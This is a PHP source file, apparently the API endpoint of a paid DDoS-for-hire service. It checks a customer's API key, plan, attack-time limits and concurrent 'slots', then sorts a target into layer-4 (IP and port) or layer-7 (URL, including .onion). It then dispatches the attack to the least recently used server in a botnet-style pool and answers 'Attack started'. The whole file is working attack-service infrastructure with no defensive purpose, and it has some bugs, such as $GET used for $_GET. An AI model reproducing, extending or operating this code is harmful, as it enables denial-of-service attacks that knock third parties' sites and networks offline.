<?php
// Define Includes
define('allow', true);
define('api', true);
//Path includes
include_once('../inc.php');

//Define variables
$userID = (int)@$_GET['user'];
$api_key = @$_GET['api_key'];

$target = rawurldecode(@$_GET['target'] ?? '');
$target = preg_replace('/[\{\}\$\|\[\]%]/', '', $target);

$time = (int)@$_GET['time'];
$method = @$_GET['method'];

$userData = $User->UserDataID($userID, 1) ?? [];
$Addons = is_array($userData) ? explode('|', $userData['addons']) : [];
$MethodName = $Methods->MethodsDataNameAPI($method)['name'] ?? null;
$MethodID = $Methods->MethodsDataNameAPI($method)['id'] ?? null;

$plan_concurrents = $Api->UsersApiDataID2($api_key, 1)['Slots'] ?? null;
$running_attacks = $ALogs->UserAttacks(@$userID)['Count'] + 1;


$error = '';
$message = '';

if ($Main->Data()['api'] == true && $userID != 1 && empty($message)) {
   header('Content-Type: application/json');
   die(json_encode(['status' => false, 'message' => "Technical cats in progress service will be available soon"]));
}


//Check user variables
if (empty($userID)) {
   if (empty($message)) {
      header('Content-Type: application/json');
      die(json_encode(['status' => false, 'message' => "UserID is empty"]));
   }
}
//Check api_key variables
if (empty($api_key)) {
   if (empty($message)) {
      header('Content-Type: application/json');
      die(json_encode(['status' => false, 'message' => "API key is empty"]));
   }
}

// Check if user has valid api_key
if ($Api->UsersApiDataID2(@$api_key, 1)['userID'] != $userID) {
   if (empty($message)) {
      header('Content-Type: application/json');
      die(json_encode(['status' => false, 'message' => "API key does not belong to user"]));
   }
}


//Check basic variables
if (empty($target) || empty($time) || empty($method)) {
   if (empty($message)) {
      header('Content-Type: application/json');
      die(json_encode(['status' => false, 'message' => "Check API Doc. and set required fill"]));
   }
}

//Check if methood is allowed to use in api
if ($Methods->MethodsDataNameAPI(@$method)['api'] != 1) {
   if (empty($message)) {
      header('Content-Type: application/json');
      die(json_encode(['status' => false, 'message' => "Method not allowed in API access"]));
   }
}

if ($User->UserDataID($userID, 1)['plan'] == 0) {
   if (empty($message)) {
      header('Content-Type: application/json');
      die(json_encode(['status' => false, 'message' => "The user does not have a plan"]));
   }
}

// Check if user has api access
if ($Api->UsersApiDataID2($api_key, 1)['api_key'] == $api_key) {
   if (($Plan->PlanDataID($User->UserDataID(@$userID, 1)['plan'])['api'] != 1) && ($Addons[2] != 1)) {
      if (empty($message)) {
         header('Content-Type: application/json');
         die(json_encode(['status' => false, 'message' => "User plan does not allow API access"]));
      }
   }
}


//Check if user allow to use premium methods
if ($Methods->MethodsDataNameAPI(@$method)['class'] == 2) {
   if ($Plan->PlanDataID($User->UserDataID(@$userID, 1)['plan'])['premium'] != 1 && $Addons[3] != 2) {
      if (empty($message)) {
         header('Content-Type: application/json');
         die(json_encode(['status' => false, 'message' => "Premium methods not allowed for user plan"]));
      }
   }
}

//Check expiration time of the plan
if ($User->UserDataID(@$userID, 1)['expire'] < time()) {
   if (empty($message)) {
      header('Content-Type: application/json');
      die(json_encode(['status' => false, 'message' => "Plan expired"]));
   }
}

// Check is IP Whitelisted
$WL = $Api->UsersApiDataID2(@$api_key, 1)['WhiteList'];
$IpExplode = explode('|', $Secure->ApiIps($WL));

if (filter_var($IpExplode[0], FILTER_VALIDATE_IP)) {
   if ($IpExplode[0] != $User->UserIP()) {
      if ($IpExplode[1] != $User->UserIP()) {
         if ($IpExplode[2] != $User->UserIP()) {
            if (empty($message)) {
               header('Content-Type: application/json');
               die(json_encode(['status' => false, 'message' => "IP not indicated in whitelist"]));
            }
         }
      }
   }
}

// Check for BlackList
$blacklistData = $BlackList->BlackListDataAll()['Response'];
$targetDomain = strtolower(parse_url($target, PHP_URL_HOST));

foreach ($blacklistData as $blacklistItem) {
   $blacklistUrl = $blacklistItem['word'];
   $blacklistDomain = strtolower(parse_url($blacklistUrl, PHP_URL_HOST));

   if ($targetDomain === $blacklistDomain) {
      if (empty($message)) {
         header('Content-Type: application/json');
         die(json_encode(['status' => false, 'message' => "Target domain blacklisted: $blacklistDomain"]));
      }
   }
}



// Check Attack Time
if ($time > $Api->UsersApiDataID2(@$api_key, 1)['AttackTime']) {
   if (empty($message)) {
      header('Content-Type: application/json');
      die(json_encode(['status' => false, 'message' => "You have exceeded the allowed limit of attack time"]));
   }
}

//Check allowed slots indicated in api_key
if ($ALogs->LogsDataRunningOnAPI(@$userID) >= $Api->UsersApiDataID2(@$api_key, 1)['Slots']) {
   if (empty($message)) {
      header('Content-Type: application/json');
      die(json_encode(['status' => false, 'message' => "You have exceeded the allowed limit specified in the api parameters"]));
   }
}


// Check max allowed slots in plan
if (($userData = $User->UserDataID(@$userID, 1)) && ($userAttacks = $ALogs->UserAttacks($userData['id'])) && ($planData = $Plan->PlanDataID($userData['plan']))) {
   if (isset($userAttacks['Count'], $planData['concurrents'])) {
      $addon = $Addons[0] ?? 0;
      if ($userAttacks['Count'] >= $planData['concurrents'] + $addon) {
         if (empty($message)) {
            header('Content-Type: application/json');
            die(json_encode(['status' => false, 'message' => "You have exceeded your total concurrents."]));
         }
      }
   }
}


//Check type of indicated target
$layer = null;

if (filter_var($target, FILTER_VALIDATE_IP)) {
   $layer = 4;
} else if (preg_match('/\b(?<!\.)(?:[a-z0-9]+\.)+onion\b/', $target)) {
   $layer = 7;
} else if (filter_var($target, FILTER_VALIDATE_URL)) {
   $layer = 7;
}

if (!$layer) {
   if (empty($message)) {
      header('Content-Type: application/json');
      die(json_encode(['status' => false, 'message' => "Invalid target"]));
   }
}

//Basic parameters for layer 4
switch ($layer) {
   case 4:
      //Check default parameters for layer 4
      $port = (int)@$_GET['port'];
      $pps = (int)@$_GET['pps'];

      //Check if method is allowed for layer 4
      if ($Methods->MethodsDataNameAPI($method)['layer'] != 4) {
         if (empty($message)) {
            header('Content-Type: application/json');
            die(json_encode(['status' => false, 'message' => "This method not exist"]));
         }
      }

      //Check range of indicated port
      if ($port < 1 || $port > 65535) {
         if (empty($message)) {
            header('Content-Type: application/json');
            die(json_encode(['status' => false, 'message' => "Invalid range port: 0-65553"]));
         }
      }

      //Check if pps is not empty
      if (!empty($pps)) {
         if (empty($message)) {
            header('Content-Type: application/json');
            die(json_encode(['status' => false, 'message' => "Fill in the pps field or set 0."]));
         }
      }
      break;

   case 7:

      //Check if method is allowed for layer 7
      if ($Methods->MethodsDataNameAPI($method)['layer'] != 7) {
         if (empty($message)) {
            header('Content-Type: application/json');
            die(json_encode(['status' => false, 'message' => "This method doesnt exist."]));
         }
      }

      //Check allowed request methods for layer 7 and postdata for POST requests
      $requestmethod = @$GET['requestmethod'];
      $requestmethod = in_array(@$requestmethod, ['GET', 'POST']) ? @$requestmethod : 'GET';

      //Check allowed postdata for post request method
      $postdata = ($requestmethod === 'POST') ? @$_GET['postdata'] : 'false';

      //Check max length for postdata
      if (!empty($postdata)) {
         $postdataLength = strlen($postdata);
         if ($postdataLength < 1 || $postdataLength > 1000) {
            if (empty($message)) {
               header('Content-Type: application/json');
               die(json_encode(['status' => false, 'message' => "Post data must have a length between 1 and 1000 characters."]));
            }
         }
      }


      // Set default method-specific ratelimits
      $methodRatelimits = [
       8 => 100,
       26 => 100,
      ];

      // Get ratelimit from post data, default to 100 if not indicated
      $ratelimit = (float)($_GET['ratelimit'] ?? $methodRatelimits[$MethodID] ?? 100);

      // Check if ratelimit is less than or equal to 0
      if ($ratelimit <= 0) {
         header('Content-Type: application/json');
         die(json_encode(['status' => false, 'message' => "Ratelimit cannot be 0"]));
      }

      // Set method-specific ranges
      $methodRanges = [
       8 => [1, 100],
       26 => [1, 100],
      ];

      // Determine which range to use based on method
      $range = $methodRanges[$MethodID] ?? [1, 100];

      // Check if ratelimit is within the selected range for the given method
      if ($ratelimit < $range[0] || $ratelimit > $range[1]) {
         header('Content-Type: application/json');
         die(json_encode(['status' => false, 'message' => "Ratelimit has an invalid range for this method"]));
      }

      // Check if ratelimit is a number
      if (!is_numeric($ratelimit)) {
         header('Content-Type: application/json');
         die(json_encode(['status' => false, 'message' => "Ratelimit must be a number"]));
      }

      $cookie = @$GET['cookie'];


      break;

   default:

      header("Content-Type: application/json");
      die(json_encode([
       "status" => 'false',
       "message" => "Unable to initiate attack, please specify parameters"
      ]));

      break;
}

if ($error == false) {

   $servers = $Api->ApiDataAll()['Response'];

   $available_servers = array_filter($servers, function ($server) use ($Api, $MethodName, $layer) {
      return $server['status'] != 1 && $server['layer'] == $layer
       && in_array($MethodName, explode('|', $Api->ApiDataID($server['id'], 1)['methods']))
       && ($server['slots'] > 0 && ($loaded = ($Api->CountApiOfAttacks($server['id']) / $server['slots']) * 100) < 100);
   });

   usort($available_servers, function ($a, $b) {
      return $a['lastUsed'] - $b['lastUsed'];
   });

   if (empty($available_servers)) {
      header("Content-Type: application/json");
      die(json_encode([
       "status" => 'false',
       "message" => "All servers are busy, please wait. $MethodName"
      ]));
   }

   $serverID = $available_servers[0]['id'];

   if ($Api->CountApiOfAttacks($serverID) >= $Api->ApiDataID($serverID, 1)['slots']) {
      header("Content-Type: application/json");
      die(json_encode([
       "status" => 'false',
       "message" => "All servers are busy, please wait."
      ]));
   }

   // Set the API link
   $api_link = $Api->ApiDataID($serverID, 1)['link'];
   $ServerName = $Api->ApiDataID($serverID, 1)['name'];

   // Set the default values for the action and mode parameters
   $default_action = "start";

   // Use a regular expression to find all of the parameter placeholders in the API link
   $pattern = "/\[([^\]]+)\]/";
}


switch ($layer) {
   case 7:
      // Use preg_replace_callback to replace the placeholders with their corresponding values
      $api_link = preg_replace_callback($pattern, function ($matches) use ($default_action, $target, $time, $MethodName, $requestmethod, $postdata, $ratelimit, $cookie) {
         // Get the parameter name from the matches
         $param_name = $matches[1];

         // Check the parameter name and return the corresponding value
         switch ($param_name) {
            case "action":
               return $default_action;
            case "target":
               return base64_encode($target);
            case "time":
               return $time;
            case "method":
               return $MethodName;
            case "ratelimit":
               return $ratelimit;
            case "requestmethod":
               return $requestmethod;
            case "postdata":
               return base64_encode($postdata);
            case "cookie":
               return base64_encode($cookie);
            default:
               return "";
         }
      }, $api_link);

      // Set the URL, HTTP headers, and timeout options for the request
      $options = [
       'url' => $api_link,
       'headers' => [
        'cache-control' => 'no-cache',
        'content-type' => 'application/x-www-form-urlencoded',
        'Connection' => 'keep-alive',
       ],
       'timeout' => 5,
      ];


      try {
         $ALogs->CreateLog($userID, $target, parse_url($target, PHP_URL_HOST), $time, '0', $MethodID, $source_stopper = rand(10, 9999999), $Api->ApiDataID($serverID, 1)['id'], 'api', '7');

         $response = $Client->request(
          'GET', $options['url'],
          [
           'headers' => $options['headers'],
           'timeout' => $options['timeout'],
           'verify' => false,
          ]
         );

         $stopper = json_decode($response->getBody()->getContents(), true)['stopper'] ?? 0;
         $ALogs->UpdateLog($source_stopper, $stopper);

         $message = [
          "status" => 'true',
          "stopper" => $stopper,
          "message" => "Attack started: $running_attacks / $plan_concurrents"
         ];

      } catch (\Exception $e) {

         $message = ["status" => 'false', "message" => "$e"];
         $ALogs->DeleteLog($source_stopper);

      } finally {
         $Api->LastUsed($serverID);
         header("Content-Type: application/json");
         die(json_encode($message));
      }


      break;
   case 4:
      // Use preg_replace_callback to replace the placeholders with their corresponding values
      $api_link = preg_replace_callback($pattern, function ($matches) use ($default_action, $target, $port, $time, $MethodName, $pps) {
         // Get the parameter name from the matches
         $param_name = $matches[1];

         // Check the parameter name and return the corresponding value
         switch ($param_name) {
            case "action":
               return $default_action;
            case "target":
               return $target;
            case "time":
               return $time;
            case "method":
               return $MethodName;
            case "port":
               return $port;
            case "pps":
               return $pps;
            default:
               return "";
         }
      }, $api_link);

      // Set the URL, HTTP headers, and timeout options for the request
      $options = [
       'url' => $api_link,
       'headers' => [
        'cache-control' => 'no-cache',
        'content-type' => 'application/x-www-form-urlencoded',
       ],
       'timeout' => 5,
      ];

      try {

         $ALogs->CreateLog($userID, $target, 'empty', $time, $port, $MethodID, $source_stopper = rand(10, 9999999), $Api->ApiDataID($serverID, 1)['id'], 'api', '4');

         $response = $Client->request(
          'GET', $options['url'],
          [
           'headers' => $options['headers'],
           'timeout' => $options['timeout'],
           'verify' => false,
          ]
         );

         $stopper = json_decode($response->getBody()->getContents(), true)['stopper'] ?? 0;
         $ALogs->UpdateLog($source_stopper, $stopper);

         $message = [
          "status" => 'true',
          "stopper" => $stopper,
          "message" => "Attack started: $running_attacks / $plan_concurrents"
         ];

      } catch (\Exception $e) {

         $message = ["status" => 'false', "message" => "$e"];
         $ALogs->DeleteLog($source_stopper);

      } finally {
         $Api->LastUsed($serverID);
         header("Content-Type: application/json");
         die(json_encode($message));
      }

      break;

}

// Json App Header
header("Content-Type: application/json");
// Encode
$print = json_encode($message ?? []);
// Print
print_r($print);
die();
?>